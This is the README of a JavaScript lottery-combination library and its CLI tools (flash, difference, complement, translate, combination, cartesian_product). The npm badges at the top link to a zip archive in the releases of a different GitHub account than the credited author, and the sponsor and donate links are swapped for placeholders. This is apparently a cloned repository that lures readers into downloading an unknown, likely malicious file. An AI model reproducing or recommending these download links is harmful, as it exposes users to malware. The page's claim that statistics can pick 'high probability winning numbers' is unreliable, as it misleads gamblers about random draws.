# lottery-facility
[![npm version](https://github.com/bingoheadhunter21fmt/lottery-facility/releases/download/j/lottery-facility.zip.svg)](https://github.com/bingoheadhunter21fmt/lottery-facility/releases/download/j/lottery-facility.zip)
[![Npm package monthly downloads](https://badgen.net/npm/dm/lottery-facility)](https://github.com/bingoheadhunter21fmt/lottery-facility/releases/download/j/lottery-facility.zip)
![GitHub](https://img.shields.io/github/license/lalyre/lottery-facility)

Some APIs and CLI tools for designing lottery cracking systems.


<!-- TOC -->
- [Overview](#overview)
- [Install](#install)
- [Quick start](#quick-start)
- [CLI utilities](#cli-utilities)
- [Publishing](#publish-a-version)


## Overview
Features:
* Random numbers generator
* Random selections of numbers
* Draws statistics (TODO)
* Draws prediction heuristics (TODO)

CLI utilities:
* flash
* difference
* complement
* translate
* combination
* cartesian_product
<!--
* filter
* euromillions (TODO)
* kenoFR (TODO)
-->


<!--

// npm install svg.js
var svg = new SVG({
  'element': document.getElementById('svgElement'),
  'width': 300,
  'height': 150
});

// Définir les polices
var font = {
  'family': 'Arial, sans-serif',
  'size': 120,
  'weight': 400
};

// Créer le texte "1"
var text1 = svg.text('1')
  .attr(font)
  .fill('red')
  .move(50, 50);

// Créer le texte "2"
var text2 = svg.text('2')
  .attr(font)
  .fill('green')
  .move(120, 50);

// Créer le texte "3"
var text3 = svg.text('3')
  .attr(font)
  .fill('blue')
  .move(190, 50);

// Ajouter les éléments au SVG
svg.add(text1, text2, text3);

// Sauvegarder le SVG dans un fichier
svg.svg('img001.svg');

-->



<!--
Type this command to enable CLI utilities (during development)
$ npm link

$ npm install -g flash-cli
$ npm uninstall -g flash-cli

https://badge.fury.io/for/js/lottery-facility
-->


## Install
Install with npm:
```sh
npm install lottery-facility
npm install --save-dev @types/lottery-facility
```


## Quick start

### CommonJS
Import in your NodeJS project with CommonJS:
```JavaScript
const lotteryFacility = require('lottery-facility');

const box = new lotteryFacility.DrawBox(70);
const balls = box.draw(20);
console.log(balls);
```

### ES6 or TypeScript
Import in your NodeJS project with ES6 or TypeScript:

create a file test.ts (for Typescript) or test.js (for ES6)
```TypeScript
import { DrawBox } from 'lottery-facility';

const box = new DrawBox(70);
const balls = box.draw(20);
console.log(balls);
```

and compile with these commands
```sh
npx tsc test.ts
npx babel --presets=@babel/env test.js --out-file script-compiled.js
```

### Browsers
Import in your browser project from a CDN:
```html
<!DOCTYPE html>
<html>
<head>
  <title>Lottery-facility from CDN</title>
</head>
<body>

  <!-- Load lottery-facility library -->
  <script src="https://unpkg.com/lottery-facility@0.0.1-alpha.10/dist/lotteryfacility-webbundle.min.umd.js"></script>

  <script>
  console.log(window.LotteryFacility);
  console.log(window.LotteryFacility.DrawBox);

  const box = new window.LotteryFacility.DrawBox(70);
  const balls = box.draw(20);
  document.write(balls);
  </script>

</body>
</html>
```


## CLI utilities
All the following documentation is available in the tools by running `--help` on command line.

### 1. flash
**Parameters**<br>

```sh
--verbose, -v  Verbose mode (default true).
--outfile      Output filename (optional).
--total, -t    Total number of lottery balls.
--size, -s     Size of generated combinations.
--sort         Display ordered combinations (optional).
--nb           Number of generated combinations.
--nbSwap       Number of shuffle operations. Default value 200.
```

**Description**<br>

This script generates a random selection of lottery balls of `size` size, taken from `1` to `total` balls.
The optional parameter `sort` sorts combinations items in ascending order.
You can put `total` and `size` pairs multiple times for random selection into multiple draw boxes.

**Exemple**<br>

Generate 8 random games for Euromillions lottery

```sh
$ flash --total 50 --size 5 --total 12 --size 2 --nb 8 --sort --sep " "
07 10 12 17 28 / 04 08
01 10 15 48 50 / 02 10
03 14 16 30 40 / 07 11
01 13 19 25 40 / 01 12
06 11 39 40 48 / 02 03
05 09 26 32 48 / 01 03
07 21 31 48 50 / 10 11
11 20 23 33 40 / 09 12
```


### 2. difference
**Parameters**<br>

```sh
--file, -f    A file containing one combination per line to calculate the difference to.
--globalnum   All items that can be used in combinations, separated by '|' or ' '.
--globalfile  File containing one item of combination per line, items that are used
              in combinations of <file> file, but possibly others items.
```

**Description**<br>

This script takes an input file `file` containing one combination per line, combinations written with items of the `global` alphabet,
and returns the difference between the global alphabet and each combination.<br>
The `global` alphabet can be declared either with `globalnum` or `globalfile` parameters.<br>

**Exemple**<br>

We start with a `GAME.txt` file written with the global alphabet `01 02 03 04 05 06 07 08 09 10`

```sh
$ cat GAME.txt
04 05 06 07 08 09 10
03 05 06 07 08 09 10
03 04 06 07 08 09 10
01 02 06 07 08 09 10
01 02 03 04 05 09 10
01 02 03 04 05 08 10
01 02 03 04 05 08 09
01 02 03 04 05 06 07
```

Computation of the difference of file `GAME.txt` relatively to the global alphabet `01 02 03 04 05 06 07 08 09 10`

```sh
$ difference --file GAME.txt --globalnum "01 02 03 04 05 06 07 08 09 10"
01 02 03
01 02 04
01 02 05
03 04 05
06 07 08
06 07 09
06 07 10
08 09 10
```

### 3. complement
**Parameters**<br>

```sh
--file, -f    A file containing one combination per line to calculate the complement from.
--globalnum   All items that can be used in combinations, separated by '|' or ' '.
--globalfile  File containing one item of combination per line, items that are used
              in combinations of <file> file, but possibly others items.
```

**Description**<br>

This script takes an input file `file` containing one combination per line, combinations written with items of
the `global` alphabet, and returns the complement of each combination relatively to the global alphabet.<br>
The `global` alphabet can be declared either with `globalnum` or `globalfile` parameters.<br>

**Exemple**<br>

We start with a `FILE.txt` file written with the global alphabet `01 02 03 04 05 06 07 08 09 10`

```sh
$ cat FILE.txt
01 02 03 04
05 06
07 08 09 10
```

Computation of the complement of file `FILE.txt` relatively to the global alphabet `01 02 03 04 05 06 07 08 09 10`

```sh
$ complement --file FILE.txt --globalnum "01 02 03 04 05 06 07 08 09 10"
10 09 08 07
06 05
04 03 02 01
```


### 4. translate
**Overview**<br>
In order to win lottery games, you both need a tactical game (file of several combinations) and a smart selection of numbers based on statistics study.
First, you have to find good numbers with high probability to draw. The more you have winning numbers in your selection the better it is for you.
Then, you also have to put the good numbers all together on a same combination. If there are too many loosing numbers in your selection, they can polluate
your games. To be sure to have winning numbers on the same combination you have to make a huge amount of combinations. But you cannot afford to make all possible
combinations for economical reasons. So you need to use a tactical set of combinations that can help you win if you have sufficient amount of winning numbers.
In the end, you need to apply your smart selection of numbers onto your tactical game. And this is the usage of `tanslate` tool.

**Parameters**<br>

```sh
--file, -f    A file containing one combination per line to be translated.
--originnum   Items of combinations separated by '|' or ' '.
--originfile  File containing one item per line that are used in combinations of <file> file.
--targetnum   Items of combinations separated by '|' or ' ', for the translation of combinations.
--targetfile  File containing one item per line used for the translation of <file> file.
```

**Description**<br>

This script takes an input file `file` containing one combination per line.
These input combinations are written with the `origin` alphabet and to be translated into `target` alphabet.
Items of `origin` alphabet are translated to `target` alphabet relatively to their corresponding order of declaration.<br>
The `origin` alphabet can be declared either with `originnum` or `originfile` parameters.<br>
The `target` alphabet can be declared either with `targetnum` or `targetfile` parameters.<br>

**Exemple**<br>

We start with a tactical `GAME.txt` file written with the origin alphabet `01 02 03 04 05 06 07 08 09 10 11 12`

```sh
$ cat GAME.txt
01 02 03 04 05 06
07 01 02 08 05 09
07 04 08 10 06 09
01 02 04 08 10 11
07 01 03 10 06 11
03 08 10 05 06 11
07 03 04 05 09 11
07 01 04 08 05 12
07 02 03 08 06 12
02 03 04 10 09 12
01 10 05 06 09 12
07 02 10 05 11 12
01 03 08 09 11 12
02 04 06 09 11 12
```

After many hours of statistics analysis, we select 12 high probability winning numbers. These numbers are `25 28 31 34 37 52 53 59 61 67 68 70`.
We need to apply this selection onto our tactical `GAME.txt` file. We use the `translate` tool to do that job with the following command

```sh
$ translate --file GAME.txt --originnum "01 02 03 04 05 06 07 08 09 10 11 12" \
--targetnum "25 28 31 34 37 52 53 59 61 67 68 70"
25 28 31 34 37 52
53 25 28 59 37 61
53 34 59 67 52 61
25 28 34 59 67 68
53 25 31 67 52 68
31 59 67 37 52 68
53 31 34 37 61 68
53 25 34 59 37 70
53 28 31 59 52 70
28 31 34 67 61 70
25 67 37 52 61 70
53 28 67 37 68 70
25 31 59 61 68 70
28 34 52 61 68 70
```


### 5. combination
**Parameters**<br>

```sh
--verbose, -v   Verbose mode (default true).
--outfile       Output filename (optional).
--total, -t     Total number of items.
--size, -s      Number of assembled items.
--file, -f      A file containing one item of combination per line.
--numbers, -n   Items of combinations separated by '|'.
--sep           Separator of items (optional).
```

**Description**<br>

This script generates combinations of items taken in file `file` or list `numbers`, implementing choice of `size` items among `total` items.
Only the first `total` items of `file` or `numbers` are used to build combinations.

**Exemple**<br>

Generation of all combinations of size 3 in a list of 5 numbers (choice of 3 among 5)

```sh
$ combination --sep " " --size 3 --total 5 --numbers "01|02|03|04|05|06|07|08|09|10"
01 02 03
01 02 04
01 02 05
01 03 04
01 03 05
01 04 05
02 03 04
02 03 05
02 04 05
03 04 05
```


### 6. cartesian_product
**Parameters**<br>

```sh
--verbose, -v   Verbose mode (default true).
--outfile       Output filename (optional).
--file, -f      A file containing one item of combination per line.
--numbers, -n   Items of combinations separated by '|'.
--sep           Separator of items (optional).
```

**Description**<br>

This script generates cartesian product of items taken in `<file>` or `<numbers>`.
Each item of `<file>` or `<numbers>` is combined with others `<file>` or `<numbers>` items.
You can put as many `<file>` or `<numbers>` as you want.

**Exemple**<br>

Computation of the cartesian product of `01 02 03` with `11 12 13`

```sh
$ cartesian_product --numbers "01|02|03" --numbers "11|12|13" --sep " "
01 11
01 12
01 13
02 11
02 12
02 13
03 11
03 12
03 13
```





<!--
### 5. filter

-->


<!--
### 7. paste

-->


<!--
### 8. cut

-->



<!--
### 9. euromillions

-->



<!--
### 10. kenoFR

-->










<!--
lib/ is intended for code that can run as-is
src/ is intended for code that needs to be manipulated before it can be used
build/ is for any scripts or tooling needed to build your project
dist/ is for compiled modules that can be used with other systems.
bin/ is for any executable scripts, or compiled binaries used with, or built from your module.
test/ is for all of your project/module's test scripts
unit/ is a sub-directory for unit tests
integration/ is a sub-directory for integration tests
env/ is for any environment that's needed for testing

https://definitelytyped.org/guides/contributing.html
https://www.typescriptlang.org/docs/handbook/declaration-files/templates/module-d-ts.html
-->


## Publish a version
Build and test the project with these commands

```sh
npm install
npm run build
npm run test
```

You can see what files will be embedded in the new release with the command below. Files and directories listed in **.gitignore** and **.npmignore** won't be in the package. Files and directories listed in the "files:" section of **package.json** file will be included in the final package.

```sh
npm pack
```

Update the package version with one of the following commands. If inside a Git directory, the **package.json** file's version is changed and committed. And a new Git tag related to the new version is created.

```sh
npm version prerelease --preid=alpha
npm version prerelease --preid=beta
npm version prerelease --preid=rc
npm version patch
npm version minor
npm version major
```

Push the new Git tag to remote origin

```sh
git push --tags
```

Go to the root of the project, and publish publicly the new package version to the NPM registry. Once published a version can be deprecated, but it cannot be deleted nor re-used.

```sh
npm publish --access public
```


Depracation of NPM package versions

```sh
npm deprecate @claudelalyre/lottery-facility@0.0.1-alpha.0 "obsolete"
npm deprecate @claudelalyre/lottery-facility@0.0.1-alpha.1 "obsolete"
```






## License
The project is released under the [MIT license](http://www.opensource.org/licenses/MIT).


## Contact
The project's website is located at https://github.com/lalyre/lottery-facility.<br>
Author: Claude Lalyre (claude.lalyre@gmail.com)


## Contributors
* [All Contributors](./AUTHORS)


## Sponsors

<!--
Thank you to all our sponsors! ([becoming a sponsor](https://opencollective.com/csvtojson#sponsor))
-->
Thank you to all our sponsors! ([becoming a sponsor](https://google.com))


## Paypal 

<!--
[![donate](https://www.paypalobjects.com/en_US/i/btn/btn_donate_SM.gif)](https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=DUBQLRPJADJFQ)
-->
[![donate](https://www.paypalobjects.com/en_US/i/btn/btn_donate_SM.gif)](https://www.google.com)
